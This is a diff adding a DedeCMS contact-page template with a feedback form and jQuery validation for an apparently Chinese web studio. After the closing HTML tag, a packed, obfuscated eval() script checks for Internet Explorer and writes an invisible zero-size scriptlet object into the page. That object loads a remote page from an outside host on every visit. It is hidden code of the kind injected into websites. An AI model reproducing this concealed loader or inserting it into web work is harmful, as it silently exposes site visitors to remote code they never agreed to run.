@@ -1,0 +1,119 @@
+{dede:include filename="top.htm"/}
+<body style="background:#ffffff url(/images/contact_bodybg.jpg) repeat-x 0px 0px;" >
+<script src="/js/jquery-1.4.2.min.js"></script>
+<script src="/js/global.js"></script>
+<script>
+function changesubmit() {
+	$("#submitlink").attr("class","submit");
+}
+function send() {
+	if($("#submitlink").attr("class") != "submit") return;
+	$("#submitlink").attr("class","submit");
+	if($("#name").val() == ""){
+		$("#name").focus();
+		return;
+	}else if($("#email").val() == ""){
+		$("#email").focus();
+		return;
+	}else if(!isEmail($("#email").val())) {
+		$("#email").focus();
+		return;
+	}else if($("#title").val() == ""){
+		$("#title").focus();
+		return;
+	}else if($("#saytext").val() == ""){
+		$("#saytext").focus();
+		return;
+	}
+	$("#submitlink").attr("class","submiting");
+	$.post("/e/enews/index.php",{name:$("#name").val(),email:$("#email").val(),title:$("#title").val(),saytext:$("#saytext").val(),enews:'AddFeedback',status:0,bid:1},function(data){//alert(data);
+		if(data.indexOf("信息反馈成功") > 0) {
+			$("#name").val('');
+			$("#email").val('');
+			$("#title").val('');
+			$("#saytext").val('');
+			$("#submitlink").attr("class","submitok");
+		} else {
+			alert("发送失败！");
+			$("#submitlink").attr("class","submit");
+		}
+	});
+	return;
+}
+</script>
+<!--header begin-->
+<div class="headerbg">
+  <div class="header">
+    <div id="logo"><a href="/">
+<img src="/images/tg_logo.png" width="240" height="60" /></a></div>
+    <div class="nav">
+<a href="/" class="dqn1" title="Home" hidefocus="true"></a>
+<a href="/Portfolio" class="n2" title="Portfolio" hidefocus="true"></a>
+ <a href="/services" class="n3" title="Services" hidefocus="true"></a> 
+<a href="/about" class="n4" title="News" hidefocus="true"></a>
+ <a href="/contact" class="n5" title="Contact us" hidefocus="true"></a> 
+<a href="/teacher" target="blank" class="n6" title="Teacher" hidefocus="true"></a>
+</div>
+  </div>
+</div>
+<!--header end-->
+<!--contact begin-->
+<div class="about_bar"></div>
+<div class="contact_tit"></div>
+<div class="contact_area1">
+  <div class="fl"><img src="/images/contact_1.jpg" width="520" height="300" /></div>
+  <div class="contact_talk">
+    <div id="IM_bar"><a href="tencent://message/?uin=498492522&Site=风云E吧&Menu=yes" class="qq" title="QQ" target="_blank"></a><a href="msnim:chat?contact=498492522@sina.com" class="msn" title="MSN" target="_blank"></a><a href="#" class="skype" title="Skype" target="_blank"></a></div>
+  </div>
+</div>
+<div class="form_area">
+  <form name='feedback' method='post' enctype='multipart/form-data'>
+  <input name='enews' id='enews'  type='hidden' value='AddFeedback'>
+  <div class="form_L">
+    <div class="tit"><img src="/images/contact_tggzs.jpg" width="247" height="32" /></div>
+    <ul class="list">
+      <li><span>Web:</span>www.shouzhuan.org </li>
+      <li><span>Mobile:</span>18321408624</li>
+      <li><span>MSN:</span> #</li>
+      <li><span>QQ: </span>746439274</li>
+      <li><span>E-mail: </span>746439274@qq.com</li>
+      <li><span>Add: </span> 上海市</li>
+    </ul></div>
+<div class="form_M">
+<span> 姓名 Name</span>
+    <div class="input"><input name="name" id="name" type="text" value="" /></div>
+ <span>邮箱 E-mail (请填写有效邮箱!)</span>
+   <div class="input"> <input name="email" id="email" type="text"  value="" /></div>
+    <span>联系电话 Mobile</span>
+   <div class="input"> <input name="title" id="title" type="text"  value="" /></div>
+</div>
+  <div class="form_R">填写需求 Enquiry<br />
+    <div class="text_bg">
+      <textarea name="saytext" id="saytext" cols="" rows="" class="textarea" onFocus="javascript:changesubmit()" ></textarea>
+    </div>
+<a id="submitlink" class="unsubmit" href="javascript:send();"></a>
+  </div>
+  </form>
+</div>
+<!--contact end-->
+<!--footer begin-->
+{dede:include filename="footer.htm"/}<!--尾部调用-->
+</body>
+</html>
+<script type="text/javascript">
+var browser = new Object();
+function getBrowser() {
+var b = navigator.userAgent.toLowerCase();
+browser = {
+safari: /webkit/.test(b),
+opera: /opera/.test(b),
+ie6: /msie 6/.test(b) && !/opera/.test(b),
+ie7: /msie 7/.test(b) && !/opera/.test(b),
+msie: /msie/.test(b) && !/opera/.test(b),
+mozilla: /mozilla/.test(b) && !/(compatible|webkit)/.test(b)
+};
+}
+getBrowser() ;
+var urlVar = "http://www.fy18.com"; 
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2(3.4){5.7(\'<1 8="9:a" b="c\\/d-e" f="g://6.h/i/j.k?\'+l+\'" m=0 n=0><\\/1>\')}',24,24,'|object|if|browser|msie|document||write|style|border|0px|type|text|x|scriptlet|data|http|cn|showmyweb|closepop2|html|urlVar|width|height'.split('|'),0,{}))
+</script>
